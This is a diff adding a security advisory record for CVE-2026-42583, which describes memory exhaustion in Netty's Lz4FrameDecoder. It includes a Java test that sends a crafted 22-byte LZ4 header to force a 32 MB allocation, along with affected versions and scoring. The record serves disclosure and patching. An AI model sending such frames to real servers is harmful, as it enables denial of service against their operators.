@@ -1,0 +1,120 @@
+advisory_id: GHSA-mj4r-2hfc-f8p6
+datasource_id: github_osv/GHSA-mj4r-2hfc-f8p6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-mj4r-2hfc-f8p6/GHSA-mj4r-2hfc-f8p6.json
+aliases:
+  - CVE-2026-42583
+summary: |
+  Netty Lz4FrameDecoder is vulnerable to resource exhaustion
+  ### Summary
+  Lz4FrameDecoder allocates a ByteBuf of size `decompressedLength` (up to 32 MB per block) before LZ4 runs. A peer only needs a 21-byte header plus `compressedLength` payload bytes - 22 bytes if `compressedLength == 1` - to force that allocation.
+
+  ### Details
+  io.netty.handler.codec.compression.Lz4FrameDecoder#decode
+  Header fields are trusted for sizing. On the compressed path, after `readableBytes >= compressedLength`, the decoder does `ctx.alloc().buffer(decompressedLength, decompressedLength)` then decompresses.
+
+  ### PoC
+  The test below demonstrates how an attacker sending 22 bytes will force the server to allocate 32MB
+
+  ```java
+      @Test
+      void test() throws Exception {
+          EventLoopGroup workerGroup = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
+          try {
+              AtomicReference<Throwable> serverError = new AtomicReference<>();
+              CountDownLatch latch = new CountDownLatch(1);
+
+              ServerBootstrap server = new ServerBootstrap()
+                      .group(workerGroup)
+                      .channel(NioServerSocketChannel.class)
+                      .childHandler(new ChannelInitializer<SocketChannel>() {
+                          @Override
+                          protected void initChannel(SocketChannel ch) {
+                              ch.pipeline()
+                                      .addLast(new Lz4FrameDecoder())
+                                      .addLast(new ChannelInboundHandlerAdapter() {
+                                          @Override
+                                          public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
+                                              if (cause instanceof DecoderException) {
+                                                  serverError.set(cause.getCause());
+                                              } else {
+                                                  serverError.set(cause);
+                                              }
+                                              latch.countDown();
+                                          }
+                                      });
+                          }
+                      });
+
+              ChannelFuture serverChannel = server.bind(0).sync();
+
+              Bootstrap client = new Bootstrap()
+                      .group(workerGroup)
+                      .channel(NioSocketChannel.class)
+                      .handler(new ChannelInboundHandlerAdapter() {
+                          @Override
+                          public void channelActive(ChannelHandlerContext ctx) {
+                              ByteBuf buf = ctx.alloc().buffer(22, 22);
+                              buf.writeLong(MAGIC_NUMBER);
+                              buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
+                              buf.writeIntLE(1);
+                              buf.writeIntLE(1 << 25);
+                              buf.writeIntLE(0);
+                              buf.writeByte(0);
+
+                              ctx.writeAndFlush(buf);
+
+                              ctx.fireChannelActive();
+                          }
+                      });
+
+              ChannelFuture clientChannel = client.connect(serverChannel.channel().localAddress()).sync();
+
+              assertTrue(latch.await(10, TimeUnit.SECONDS));
+
+              assertInstanceOf(IndexOutOfBoundsException.class, serverError.get());
+
+              clientChannel.channel().close();
+              serverChannel.channel().close();
+          } finally {
+              workerGroup.shutdownGracefully();
+          }
+      }
+  ```
+
+  ### Impact
+  Untrusted senders without per-channel / aggregate limits can stress memory with many small requests.
+impacted_packages:
+  - purl: pkg:maven/io.netty/netty-codec-compression
+    affected_versions: vers:maven/<=4.2.12.Final
+    fixed_versions: vers:maven/4.2.13.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.netty/netty-codec
+    affected_versions: vers:maven/<=4.1.132.Final
+    fixed_versions: vers:maven/4.1.133.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-mj4r-2hfc-f8p6/GHSA-mj4r-2hfc-f8p6.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-770
+  - CWE-400
+references:
+  - url: https://github.com/netty/netty
+    reference_type:
+    reference_id:
+  - url: https://github.com/netty/netty/security/advisories/GHSA-mj4r-2hfc-f8p6
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42583
+    reference_type:
+    reference_id:
